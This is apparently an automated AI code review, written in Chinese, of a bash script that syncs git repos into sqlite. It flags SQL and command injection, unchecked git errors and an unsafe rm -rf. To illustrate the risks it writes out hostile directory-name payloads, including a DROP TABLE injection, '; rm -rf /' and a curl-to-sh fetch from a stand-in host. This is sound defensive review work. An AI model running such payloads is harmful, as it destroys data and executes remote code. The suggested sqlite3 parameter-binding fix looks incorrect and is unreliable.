<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

這個 PR 新增了一個批次同步多個 git repo 的 bash 腳本，並將結果寫入 sqlite。主要風險在於 SQL 注入、命令注入、錯誤處理不足，以及併發與路徑處理的脆弱性。最該先修的是 sync_one 中的 SQL 注入與 run_hook 的 eval 使用，其次是 git 指令失敗時仍繼續執行並寫入錯誤資料的問題。

### Findings（7 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/repo_sync.sh:47` | SQL 注入：repo 名稱與 branch 未經跳脫直接插入 SQL | 0.95 |
| 🛑 | Blocker | `sandbox/repo_sync.sh:56` | 命令注入：eval 執行未受信任的 hook 路徑與參數 | 0.90 |
| ⚠️ | Major | `sandbox/repo_sync.sh:34` | git 指令失敗未中止，可能寫入錯誤資料 | 0.85 |
| ⚠️ | Major | `sandbox/repo_sync.sh:41` | ahead 計算失敗時可能產生空值或錯誤值 | 0.80 |
| ⚠️ | Major | `sandbox/repo_sync.sh:62` | cleanup_cache 使用 rm -rf 搭配變數，路徑未驗證可能誤刪 | 0.80 |
| 🔸 | Minor | `sandbox/repo_sync.sh:68` | summarize 中 total 計算可能因 grep 失敗而錯誤 | 0.70 |
| 🔸 | Minor | `sandbox/repo_sync.sh:87` | for 迴圈使用 ls 輸出，檔名含空格或換行會出錯 | 0.70 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:47</code> SQL 注入：repo 名稱與 branch 未經跳脫直接插入 SQL</summary>

`name` 來自 `basename "$dir"`，`BRANCH` 雖有格式驗證但未做 SQL 跳脫，直接以字串串接方式插入 SQL 語句。若 repo 目錄名稱包含單引號（例如 `my'repo`），會破壞 SQL 語法甚至執行任意 SQL。

**失敗情境**：攻擊者建立名為 `x'); DROP TABLE runs;--` 的目錄，腳本執行後會刪除 runs 表。

**建議**：改用參數化查詢，例如：
```bash
sqlite3 "$DB" "INSERT INTO runs VALUES(?, ?, ?, datetime('now'))" "$name" "$BRANCH" "$ahead"
```

**判斷依據**：diff 第 43 行：`sqlite3 "$DB" "INSERT INTO runs VALUES('$name', '$BRANCH', $ahead, datetime('now'))"`，其中 `$name` 和 `$BRANCH` 直接插入 SQL 字串。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:56</code> 命令注入：eval 執行未受信任的 hook 路徑與參數</summary>

`run_hook` 使用 `eval "$hook $repo"`，其中 `$hook` 是固定路徑，但 `$repo` 來自 `basename "$dir"`，可能包含 shell 特殊字元。若 repo 目錄名稱為 `$(malicious)` 或 `; rm -rf /`，eval 會執行任意命令。

**失敗情境**：攻擊者建立名為 `$(curl http://evil.sh | sh)` 的目錄，腳本執行時會下載並執行惡意腳本。

**建議**：避免使用 eval，直接執行：
```bash
"$hook" "$repo"
```
若需要傳遞多個參數，使用陣列。

**判斷依據**：diff 第 53 行：`eval "$hook $repo"`，其中 `$repo` 未經驗證或跳脫。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:34</code> git 指令失敗未中止，可能寫入錯誤資料</summary>

`git fetch`、`git checkout`、`git merge` 的錯誤僅被重導向到 log，腳本仍繼續執行。若 fetch 失敗（例如網路問題），`origin/$BRANCH` 可能不存在，導致 `git merge` 失敗，但腳本仍會執行 `git rev-list` 並寫入 sqlite，造成報表資料不正確。

**失敗情境**：網路中斷時，`git fetch` 失敗，`git merge` 因缺少遠端分支而失敗，但 `ahead` 可能被設為 0 或錯誤值，最後寫入一筆假的同步成功紀錄。

**建議**：在每個 git 指令後檢查 exit code，失敗時記錄錯誤並跳過該 repo，或使用 `set -e` 並搭配 trap 處理。

**判斷依據**：diff 第 31-35 行：三個 git 指令都只重導向 stderr，沒有檢查 exit code。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:41</code> ahead 計算失敗時可能產生空值或錯誤值</summary>

`ahead=$(git rev-list --count "origin/$BRANCH"..HEAD 2>/dev/null)` 若指令失敗（例如 HEAD 不存在或 rev-list 出錯），`ahead` 會是空字串。後續 `[ "$ahead" -gt 0 ]` 會因空字串而報錯，且 sqlite 插入時 `$ahead` 為空，可能導致型別錯誤或寫入 NULL。

**失敗情境**：若 repo 剛初始化沒有 HEAD，`git rev-list` 失敗，`ahead` 為空，`[ "$ahead" -gt 0 ]` 會觸發 bash 錯誤，且 sqlite 插入可能失敗。

**建議**：檢查 `git rev-list` 的 exit code，失敗時設定 `ahead=0` 或跳過寫入。

**判斷依據**：diff 第 37 行：`ahead` 的賦值沒有檢查指令是否成功。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:62</code> cleanup_cache 使用 rm -rf 搭配變數，路徑未驗證可能誤刪</summary>

`rm -rf "$ROOT"/.cache/*` 中 `$ROOT` 來自使用者輸入，若 `$ROOT` 為 `/` 或空字串，可能刪除整個檔案系統。雖然 `$ROOT` 是第一個參數，但未檢查是否為空或根目錄。

**失敗情境**：使用者執行 `./repo_sync.sh / main`，會嘗試刪除 `/.cache/*`，若權限足夠可能造成系統損壞。

**建議**：檢查 `$ROOT` 非空且不是 `/`，或使用更安全的清理方式（例如 find 搭配 -mindepth 1）。

**判斷依據**：diff 第 60 行：`rm -rf "$ROOT"/.cache/*`，`$ROOT` 未經驗證。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:68</code> summarize 中 total 計算可能因 grep 失敗而錯誤</summary>

`total=$(grep -c . "$LOG" 2>/dev/null) || total=0` 若 `$LOG` 不存在，grep 會失敗，但 `|| total=0` 會將 total 設為 0，這是正確的。然而若 grep 因其他原因失敗（例如權限問題），也會被設為 0，可能掩蓋錯誤。

**建議**：檢查 `$LOG` 是否存在，或使用 `wc -l` 替代。

**判斷依據**：diff 第 68 行：`grep -c` 的錯誤處理可能掩蓋非檔案不存在的錯誤。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:87</code> for 迴圈使用 ls 輸出，檔名含空格或換行會出錯</summary>

`for d in $(ls "$ROOT")` 會將 `ls` 的輸出以空白分割，若 repo 目錄名稱包含空格或換行，會被拆成多個項目，導致後續路徑錯誤。

**失敗情境**：目錄名為 `my repo` 時，迴圈會迭代 `my` 和 `repo` 兩個項目，`target` 路徑錯誤。

**建議**：使用 glob 或 find 搭配 while read：
```bash
for d in "$ROOT"/*/; do
  d=${d%/}
  ...
done
```

**判斷依據**：diff 第 78 行：`for d in $(ls "$ROOT")` 使用 ls 輸出且未正確處理檔名中的特殊字元。

</details>

---

<sub>model `deepseek-v4-pro` ｜ prompt tokens 2566 (cache hit 2560) ｜ completion tokens 2279 ｜ PR #13</sub>